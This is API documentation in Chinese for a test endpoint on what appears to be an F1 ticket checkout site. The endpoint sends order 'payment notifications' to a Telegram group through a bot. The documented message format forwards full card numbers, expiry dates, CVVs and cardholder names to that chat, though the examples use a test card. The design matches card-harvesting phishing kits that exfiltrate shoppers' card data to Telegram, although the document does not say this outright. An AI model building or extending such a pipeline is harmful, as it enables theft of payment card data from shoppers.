# Test Send 接口说明

##  接口信息

**接口地址：** `GET /api/cart/testSend`

**功能描述：** 测试发送 Telegram 通知

**请求方式：** GET

---

## 🔌 请求参数

### Query 参数

| 参数名 | 类型 | 必填 | 说明 | 示例 |
|--------|------|------|------|------|
| orderNo | string | ✅ | 订单编号 | `ORD20260519001` |

---

##  响应

### 成功响应

**HTTP Status:** `200 OK`

**Content-Type:** `text/html; charset=utf-8`

**响应内容：** HTML 页面，显示发送成功信息和订单详情

### 失败响应

**HTTP Status:** `500 Internal Server Error`

**Content-Type:** `text/html; charset=utf-8`

**响应内容：** HTML 页面，显示错误信息

---

## 💻 测试示例

### 浏览器访问

```
http://localhost:3000/api/cart/testSend?orderNo=ORD20260519001
```

### cURL 命令

```bash
curl "http://localhost:3000/api/cart/testSend?orderNo=ORD20260519001"
```

### PowerShell

```powershell
Invoke-RestMethod -Uri "http://localhost:3000/api/cart/testSend?orderNo=ORD20260519001" -Method Get
```

---

## 🔄 执行流程

```
1. 接收 orderNo 参数
   ↓
2. 从数据库查询订单信息 (f1_order 表)
   ↓
3. 构造测试数据（使用测试信用卡信息）
   ↓
4. 调用 sendTelegramNotification() 发送通知
   ↓
5. Redis 检查是否重复发送（24小时内）
   ↓
6. 发送 Telegram 消息
   ↓
7. 返回 HTML 结果页面
```

---

## 📊 测试数据

接口会使用以下测试信用卡信息：

| 字段 | 值 |
|------|------|
| cardNumber | `4111111111111111` |
| expire | `12/25` |
| cvv | `123` |
| cardName | `Test User` |
| amount | 从订单获取 |
| status | `success` |

---

## 🎯 Telegram 消息示例

```
✅ 支付通知

📋 订单号: ORD20260519001
💰 金额: 15180.14 
🏦 信用卡号: 4111111111111111
💳 卡名: Test User
 有效期: 12/25
CVV CVV: 123
时间: 2026/05/19 15:30:45
```

---

##  调试日志

### 成功日志

```
Test Send - Order No: ORD20260519001
订单信息: {
  f1OrderId: 1,
  orderNo: 'ORD20260519001',
  f1Name: 'F1 Canada GP',
  f1Money: 15180.14,
  ...
}
Telegram 通知发送成功 - 订单号: ORD20260519001
```

### 错误日志

```
Test Send - Order No: INVALID_ORDER
订单信息: Error: F1订单不存在
Test Send 错误: ApiException: F1订单不存在
```

---

## ️ 注意事项

### 1. 订单必须存在

- 接口会查询 `f1_order` 表
- 如果订单不存在，返回错误页面
- 使用有效的订单编号

### 2. Redis 去重

- 使用 Redis 防止重复发送
- 24小时内同一订单只发送一次
- 键名格式：`payment:callback:callback_{orderNo}_success`

### 3. Telegram 配置

配置在 Service 中：
```typescript
private readonly TELEGRAM_CONFIG = {
  botToken: 'YOUR_BOT_TOKEN',
  chatId: 'YOUR_CHAT_ID',
  apiUrl: 'https://api.telegram.org/bot',
};
```

### 4. 金额显示

- 金额从订单表获取（`f1_order.f1_money`）
- 如果订单金额为 0，显示 0

---

## 🧪 完整测试流程

### 1. 创建订单

```bash
curl -X POST "http://localhost:3000/api/cart/checkoutHtml" \
  -H "Content-Type: application/json" \
  -b "_shopify_y=test-user" \
  -d '{
    "f1_name": "F1 Canada GP",
    "f1_title": "Paddock Club",
    "f1_total": "$15,180.14",
    "f1_quarty": "Q1 2026"
  }'
```

获取订单号（从控制台日志或数据库）

### 2. 测试发送

```bash
curl "http://localhost:3000/api/cart/testSend?orderNo=ORD20260519001"
```

### 3. 检查 Telegram

查看 Telegram 群聊是否收到通知消息

### 4. 查看数据库

```sql
-- 查看订单
SELECT * FROM f1_order WHERE order_no = 'ORD20260519001';

-- 查看支付记录
SELECT * FROM f1_payment WHERE order_no = 'ORD20260519001';
```

---

## 📝 HTML 响应示例

### 成功页面

```html
<html>
<head>
  <title>测试发送结果</title>
</head>
<body>
  <h2 style="color: green;">✅ Telegram 通知发送成功！</h2>
  <div style="background: #f0f0f0; padding: 10px;">
    <p><strong>订单号:</strong> ORD20260519001</p>
    <p><strong>金额:</strong> 15180.14</p>
    <p><strong>订单名称:</strong> F1 Canada GP</p>
    <p><strong>发送时间:</strong> 2026/5/19 15:30:45</p>
  </div>
  <p><a href="/api/cart/testSend?orderNo=ORD20260519001">重新发送</a></p>
</body>
</html>
```

### 错误页面

```html
<html>
<head>
  <title>测试发送失败</title>
</head>
<body>
  <h2 style="color: red;"> 发送失败</h2>
  <div style="background: #fff0f0; padding: 10px;">
    <p><strong>错误信息:</strong> F1订单不存在</p>
    <p><strong>订单号:</strong> INVALID_ORDER</p>
  </div>
  <p><a href="javascript:history.back()">返回</a></p>
</body>
</html>
```

---

## 🔗 相关接口

| 接口 | 方法 | 说明 |
|------|------|------|
| `/api/cart/checkoutHtml` | POST | 创建订单 |
| `/api/cart/payment` | POST | 保存支付信息 |
| `/api/cart/testSend` | GET | 测试发送通知 |

---

## 🚀 使用建议

### 开发环境

- ✅ 可以随时测试 Telegram 通知
- ✅ 查看 HTML 响应验证功能
- ✅ 检查 Redis 去重逻辑

### 生产环境

- ⚠️ 建议添加权限控制（如 Admin 认证）
- ⚠️ 不要暴露测试接口
- ️ 记录所有测试发送日志

---

接口已完善，可以直接使用！🎉
